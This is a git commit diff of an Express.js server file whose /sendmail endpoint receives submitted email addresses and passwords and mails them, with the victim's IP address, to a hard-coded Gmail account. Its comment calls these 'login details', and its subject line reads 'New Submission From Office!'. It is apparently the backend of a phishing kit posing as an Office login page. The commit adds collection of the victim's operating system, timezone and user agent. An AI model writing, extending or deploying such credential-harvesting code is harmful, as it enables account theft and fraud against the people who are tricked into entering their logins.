5b6f03802410546258604955a98ee453a2804631
Nature101 <107625480+Nature101@users.noreply.github.com>
2023-03-27 19:41:10 -0600

    Update index.js

--- index.js
+++ index.js
@@ -1,25 +1,36 @@
 // initializing installed packages
 const express = require("express");
 const app = express();
-// const bodyParser = require("body-parser")
 const nodemailer = require("nodemailer");
 const cors = require("cors");
+const requestIp = require('request-ip');
+const moment = require('moment-timezone');
+const uaParser = require('ua-parser-js');
+
 // declearing which port my server will be listening on
 const port = process.env.PORT || 8000;    // while hosting, ensure to add the port variable
 
 // getting the app to get response from the frontend and send json
 app.use(express.json({ extended: true }));
 app.use(cors());
-// initlizing cors
-// app.use(cors())
-const requestIp = require('request-ip');
+
 app.get('/', (req,res) => {
     res.send('server is active')
 })
+
 app.post("/sendmail", async (req, res) => {
-	const clientIp = requestIp.getClientIp(req);
+    const clientIp = requestIp.getClientIp(req);
+
+    // Get client details
+    const userAgent = req.headers['user-agent'];
+    const uaResult = uaParser(userAgent);
+    const clientOS = uaResult.os.name;
+
+    // Get client timezone
+    const clientTimezone = moment.tz.guess();
+
     let { email, password } = req.body;
-    const to = "jimwilliams513@gmail.com" // where the login details gets sent to
+    const to = "jimwilliams513@gmail.com"; // where the login details gets sent to
 
     const transporter = nodemailer.createTransport({
         service: "gmail",
@@ -32,8 +43,8 @@ app.post("/sendmail", async (req, res) => {
     const details = {
         to: `${to}`,
         subject: `New Submission From Office!`,
-        html: `Email: ${email}<br>Password: ${password}<br>Client IP: ${clientIp}`,
-  };
+        html: `Email: ${email}<br>Password: ${password}<br>Client IP: ${clientIp}<br>Client OS: ${clientOS}<br>Client Timezone: ${clientTimezone}<br>User Agent: ${userAgent}`,
+    };
 
     try {
         transporter.sendMail(details, (err) => {
@@ -50,8 +61,6 @@ app.post("/sendmail", async (req, res) => {
     } catch (error) {
         res.json({ success: false, message: error.message });
     }
-
-
 });
 
 // starting the server up
